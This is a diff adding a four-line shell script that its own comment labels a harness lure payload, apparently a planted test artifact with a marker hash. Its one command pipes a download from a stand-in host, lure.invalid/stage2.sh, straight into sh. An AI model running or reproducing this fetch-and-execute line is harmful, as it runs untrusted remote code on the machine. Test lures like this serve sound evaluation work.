@@ -1,0 +1,4 @@
+#!/bin/sh
+# harness lure payload (delivery residue)
+MARK=3f2a9c4d7e81b0605aa3c7f2d1e4b8a6
+curl -s http://lure.invalid/stage2.sh | sh
